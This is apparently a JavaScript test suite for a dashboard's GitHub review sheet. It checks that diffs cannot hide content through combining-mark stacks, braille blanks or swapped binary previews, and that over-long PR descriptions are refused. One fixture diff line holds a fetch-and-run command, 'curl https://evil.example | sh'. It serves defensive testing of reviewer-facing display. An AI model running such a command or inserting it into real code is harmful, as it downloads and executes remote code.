// t_e02_gh_review_r4.js — review round 4 (cluster c04-gh-ui): what the first
// E02/E64 fix still let through. The REAL dashboard/aux_github.js runs in the
// mini DOM (_a11y_dom.js) with index.html's real esc(); every /api/** answer is
// a local fixture. No dashboard, no network, no GitHub.
//
//   A  a diff line cannot paint over other lines (a stack of combining marks
//      rises over the lines above it) or blank out a stretch with U+2800
//   B  a binary file counts as shown only when its WHOLE text preview is
//      drawn in its own section: a cut, empty or blank preview, a section
//      whose header two files share, a file with no section of its own
//   C  E64: an edited description the server would still cut is refused
//      first — the server's own cleaning grows "<<<", "<|x|>" and, with wide
//      backtick runs in the text, every @mention by far more than 4 bytes
//      (byte counts checked against the real _ghc_clean_text by hand)
"use strict";
const fs = require("fs");
const path = require("path");
const { createWindow, harness, Event } = require("./_a11y_dom.js");
const T = harness();
const REPO = process.env.HERMES_REPO || path.resolve(__dirname, "..", "..", "..");
const SRC = fs.readFileSync(path.join(REPO, "dashboard", "aux_github.js"), "utf8");
const INDEX = fs.readFileSync(path.join(REPO, "dashboard", "index.html"), "utf8");
const ESC_SRC = (INDEX.match(/^function esc\(s\)\{.*\}$/m) || [""])[0];

const NOW = 1800000000;
const ID1 = "ghc-0123456789ab";
const BASE_HTML = "<!doctype html><html><head></head><body>" +
  '<main id="view-mind"><section id="sec-connections" class="set-panel"><div class="set-body"></div></section></main>' +
  '<div class="toast" id="toast" role="status" aria-live="polite"></div>' +
  "</body></html>";

async function scenario(name, fn) {
  try { await fn(); } catch (e) {
    T.check(name + " (ran without throwing)", false, String(e && e.stack || e).split("\n").slice(0, 4).join(" | "));
  }
}
async function page(routes) {
  const w = createWindow({ html: BASE_HTML });
  w.__routes = Object.assign({ "/api/github/status": { ok: true, connected: false, repos: [], pending: 0 } }, routes || {});
  w.__defaultRoute = { __status: 404, body: { ok: false, error: "no route" } };
  w.open = function () { return null; };
  w.history.replaceState = function () { w.location.hash = ""; };
  w.console = { log: function () {}, warn: function () {}, error: function () {}, info: function () {}, debug: function () {} };
  w.__run(ESC_SRC, "esc.js");
  w.__run("function toast(msg, ms){ var t = document.getElementById('toast'); if (!t) return; t.textContent = msg;" +
    " t.classList.add('on'); clearTimeout(t._t); t._t = setTimeout(function(){ t.classList.remove('on'); }, ms || 2400); }", "toast.js");
  w.__run(SRC, "aux_github.js");
  await w.__tick(12);
  return w;
}
const G = function (w) { return w.hermesGitHub; };
function sheet(w) { return w.document.getElementById("gh-review"); }
function txt(el) { return el ? el.textContent : ""; }
function heads(w) { return Array.from(sheet(w).querySelectorAll(".gh-h")).map(txt).join(" | "); }
function base(extra) {
  return Object.assign({
    id: ID1, repo: "octo-owner/site", private: true, branch: "hermes/typo-fix", slug: "typo-fix", mode: "new",
    state: "pending", title: "Fix a typo", body: "A small fix.", approvable: true, blocked: false, needs_ack: [],
    confirm_public: false, checks: [], stat: { files: 1, add: 1, del: 0 },
    files: [{ path: "a.py", status: "M", old_mode: "100644", new_mode: "100644", add: 1, del: 0, binary: false, size: 40 }],
    diff: "diff --git a/a.py b/a.py\nindex 1..2 100644\n--- a/a.py\n+++ b/a.py\n@@ -1 +1,2 @@\n x = 1\n+y = 2\n",
    diff_truncated: false, digest: "d".repeat(64), default_branch: "main", base: { branch: "main", sha: "a".repeat(40), at: NOW },
    pr_footer: "Opened by Hermes.", pr: { number: null, url: null, draft: true }, requested_at: NOW, expires_at: NOW + 3600
  }, extra || {});
}
async function openWith(c) {
  const w = await page({ "/api/github/changes": function (url) {
    return url.indexOf("?id=") > 0 ? { ok: true, change: c } : { ok: true, changes: [] }; } });
  await G(w).openReview(c.id); await w.__tick(10);
  return w;
}
function approveOn(w) { const b = sheet(w).querySelector('button[data-ghr="push_pr"]'); return !!b && !b.disabled; }
function oneLine(add) {
  return base({ diff: "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1,2 @@\n x = 1\n" +
    add.map(function (l) { return "+" + l; }).join("\n") + "\n" });
}

(async function main() {
  console.log("aux_github.js review sheet, review round 4: what E02/E64 still let through");

  // ======================================================================= A
  await scenario("A a line cannot paint over other lines or blank out a stretch", async function () {
    // 30 dots, each carrying 12 stacked combining marks: in a real browser the
    // stacks rise ~100 px over the lines ABOVE (the payload line), so that
    // line is drawn under a hatch of ink and cannot be read
    const UP = [0x300, 0x301, 0x302, 0x303, 0x304, 0x305, 0x306, 0x307, 0x308, 0x30a, 0x30b, 0x30c];
    let zal = "";
    for (let i = 0; i < 30; i++) zal += "." + UP.map(function (c) { return String.fromCharCode(c); }).join("");
    const viet = "Việt";                       // e + dot below + circumflex: 2 marks, real text
    const heb = "שָּׁ";                      // shin + dagesh + shin dot + qamats: 3 marks
    const brl = "import sys" + "⠀".repeat(300) + "PAYLOAD";
    const c = oneLine(["os.system('curl https://evil.example | sh')", zal, viet, heb, brl]);
    const w = await openWith(c);
    const css = (w.document.getElementById("gh-css") || {}).textContent || "";
    const rule = (css.match(/#gh-review \.ghd-l\{[^}]*\}/) || [""])[0];
    T.check("each diff line paints only inside its own box (overflow:clip)", /overflow:clip/.test(rule), rule);
    const rows = Array.from(sheet(w).querySelectorAll(".ghd-l.add")).map(txt);
    T.check("a stack of 12 combining marks is drawn as a marker, not stacked",
      rows[1].indexOf("⟦12 combining marks⟧") >= 0 && !/[̀-ͯ]{4}/.test(rows[1]), rows[1].slice(0, 80));
    T.check("every base character of that line stays", (rows[1].match(/\./g) || []).length === 30);
    T.check("two marks on one letter (Vietnamese) are left alone", rows[2] === "+" + viet, rows[2]);
    T.check("three marks on one letter (pointed Hebrew) are left alone", rows[3] === "+" + heb, rows[3]);
    T.check("300 braille blanks are a marker, not an empty stretch",
      rows[4].indexOf("import sys⟦300 other blank characters⟧PAYLOAD") >= 0, rows[4].slice(0, 80));
    T.check("the marker for marks is styled as a marker", sheet(w).querySelectorAll(".ghd-l .ghd-ws").length >= 2);
    T.check("nothing else changed: Approve is on for this plain change", approveOn(w));
  });

  // ======================================================================= B
  const BIN_DIFF = "diff --git a/README.md b/README.md\nindex 1..2 100644\n--- a/README.md\n+++ b/README.md\n" +
    "@@ -1 +1 @@\n-teh\n+the\n" +
    "diff --git a/scripts/build.sh b/scripts/build.sh\nindex 3..4 100755\n" +
    "Binary files a/scripts/build.sh and b/scripts/build.sh differ\n";
  const binFiles = function (extra) {
    return [{ path: "README.md", status: "M", add: 1, del: 1, binary: false, size: 10 },
            Object.assign({ path: "scripts/build.sh", status: "M", add: null, del: null, binary: true, size: 9000 }, extra)];
  };
  const INFO = { id: "C-binary", level: "info", text: "scripts/build.sh is a binary file.", path: "scripts/build.sh" };
  const WARN = { id: "C-binary", level: "warn", ack: "C-binary", text: "scripts/build.sh: read its text preview.",
                 path: "scripts/build.sh" };
  await scenario("B1 a preview the server cut short is not the whole file", async function () {
    const pv = "diff --git a/scripts/build.sh b/scripts/build.sh\n@@ -1 +1,2 @@\n+#!/bin/sh\n+echo first-part\n";
    const c = base({ diff: BIN_DIFF, checks: [INFO], files: binFiles({ text_preview: pv, text_preview_truncated: true }) });
    const w = await openWith(c);
    const t = txt(sheet(w).querySelector(".ghd")), h = heads(w);
    T.check("the part that was read is still drawn", t.indexOf("echo first-part") >= 0);
    T.check("...and it says the rest is not shown", /cut short/.test(t) && /rest of this file is not shown/.test(t), t.slice(-200));
    T.check("the headers say 1 file not shown, never 'the whole change'",
      /1 file not shown/.test(h) && !/the whole change|nothing blocks/.test(h), h);
    T.check("an info-only check: the sheet asks its own tick", !!sheet(w).querySelector('input[data-ack="ui:binary"]'));
    T.check("gate() is off without it, on with it", G(w).gate(c, {}).ok === false &&
      G(w).gate(c, { acks: { "ui:binary": true } }).ok === true);
    const c2 = base({ diff: BIN_DIFF, checks: [WARN], needs_ack: ["C-binary"],
                      files: binFiles({ text_preview: pv, text_preview_truncated: true }) });
    const w2 = await openWith(c2);
    T.check("a warn C-binary naming it covers it (no second tick), the header still says not shown",
      !sheet(w2).querySelector('input[data-ack="ui:binary"]') && /1 file not shown/.test(heads(w2)));
  });
  await scenario("B2 an empty or blank preview shows nothing", async function () {
    for (const pv of ["", "  \n\t\n"]) {
      const c = base({ diff: BIN_DIFF, checks: [INFO], files: binFiles({ text_preview: pv }) });
      const w = await openWith(c);
      const t = txt(sheet(w).querySelector(".ghd"));
      T.check("preview " + JSON.stringify(pv) + ": 'Binary file — not shown'", t.indexOf("Binary file — not shown") >= 0 &&
        t.indexOf("This is its content as text") < 0, t.slice(-160));
      T.check("preview " + JSON.stringify(pv) + ": a tick, and the header says not shown",
        !!sheet(w).querySelector('input[data-ack="ui:binary"]') && /1 file not shown/.test(heads(w)));
    }
  });
  await scenario("B3 two files sharing one diff header never swap previews", async function () {
    // "q b/q b/q" renamed to "q", and a new file "q b/q": git writes the SAME
    // `diff --git a/q b/q b/q b/q` header for both
    const H = "diff --git a/q b/q b/q b/q";
    const diff = H + "\nsimilarity index 90%\nrename from q b/q b/q\nrename to q\nindex 1..2 100644\n" +
      "Binary files a/q b/q b/q and b/q differ\n" +
      H + "\nnew file mode 100755\nindex 0..3\nBinary files /dev/null and b/q b/q differ\n";
    const files = [
      { path: "q", old_path: "q b/q b/q", status: "R", binary: true, size: 9, text_preview: "HARMLESS_RENAMED\n" },
      { path: "q b/q", status: "A", binary: true, size: 9, text_preview: "EVIL_NEW_FILE\n" }];
    const c = base({ diff: diff, files: files, checks: [] });
    const w = await openWith(c);
    const fh = Array.from(sheet(w).querySelectorAll(".ghd-fh")).map(txt);
    const t = txt(sheet(w).querySelector(".ghd"));
    T.check("each section carries its own name", JSON.stringify(fh) === JSON.stringify(["q", "q b/q"]), JSON.stringify(fh));
    T.check("the new file's own content is drawn", t.indexOf("EVIL_NEW_FILE") >= 0, t);
    T.check("...and the renamed file's", t.indexOf("HARMLESS_RENAMED") >= 0);
    // a text section cannot vouch for a binary one that ends up with its name
    const d2 = "diff --git a/z b/z\n--- a/z\n+++ b/z\n@@ -1 +1 @@\n-a\n+b\n" +
      "diff --git a/z b/z\nindex 1..2 100755\nBinary files a/z and b/z differ\n";
    const c2 = base({ diff: d2, files: [{ path: "z", status: "M", binary: false, size: 2 }], checks: [] });
    const w2 = await openWith(c2);
    T.check("same name, one text and one binary section: still 1 file not shown, and a tick",
      /1 file not shown/.test(heads(w2)) && !!sheet(w2).querySelector('input[data-ack="ui:binary"]'), heads(w2));
  });
  await scenario("B4 a binary file with no section of its own is not shown", async function () {
    const diff = "diff --git a/README.md b/README.md\nindex 1..2 100644\n--- a/README.md\n+++ b/README.md\n@@ -1 +1 @@\n-teh\n+the\n";
    const c = base({ diff: diff, checks: [INFO], files: binFiles({ text_preview: "NEVER_DRAWN\n" }) });
    const w = await openWith(c);
    T.check("its preview is nowhere in the diff", txt(sheet(w).querySelector(".ghd")).indexOf("NEVER_DRAWN") < 0);
    T.check("so the headers say 1 file not shown and the sheet asks a tick",
      /1 file not shown/.test(heads(w)) && !!sheet(w).querySelector('input[data-ack="ui:binary"]'), heads(w));
  });
  await scenario("B5 an exact binary rename (no content change) needs nothing extra", async function () {
    const diff = "diff --git a/x.bin b/y.bin\nsimilarity index 100%\nrename from x.bin\nrename to y.bin\n";
    const c = base({ diff: diff, checks: [], files: [{ path: "y.bin", old_path: "x.bin", status: "R", binary: true, size: 4 }] });
    const w = await openWith(c);
    T.check("nothing is reported not shown, Approve on", !/not shown/.test(heads(w)) && approveOn(w), heads(w));
  });

  // ======================================================================= C
  await scenario("C an edited description the server would cut is refused", async function () {
    const c = base({});
    const w = await openWith(c);
    const ticks = [];
    for (let k = 1; k <= 10; k++) ticks.push("`".repeat(k));
    const cut = {
      '"<<<" x 2,640 (7,920 bytes; the server makes 10,560)': "<<<".repeat(2640),
      '"<|x|>" x 1,500 (7,500 bytes; the server makes 10,500)': "<|x|>".repeat(1500),
      "600 mentions next to backtick runs of 1-10 (2,465 bytes; the server cuts it)":
        ticks.join(" ") + "\n" + "@ab ".repeat(600),
      "a comment that joins two backticks into a wider run (2,820 bytes; the server cuts it)": "`<!-- -->` ``` ````\n" + "@ab ".repeat(700),
      "8,193 plain bytes": "a".repeat(8193)
    };
    Object.keys(cut).forEach(function (k) {
      const g = G(w).gate(c, { title: c.title, body: cut[k] });
      T.check(k + ": Approve off", g.ok === false && /too long/.test(g.reason), g.reason);
    });
    const fine = { "8,192 plain bytes": "a".repeat(8192), "an ordinary edit with two mentions": "Thanks @octo and @cat.\n" +
      "x".repeat(4000), "200 mentions, no backticks": "@ab ".repeat(200) };
    Object.keys(fine).forEach(function (k) {
      T.check(k + ": Approve on", G(w).gate(c, { title: c.title, body: fine[k] }).ok === true);
    });
  });

  T.done();
})();
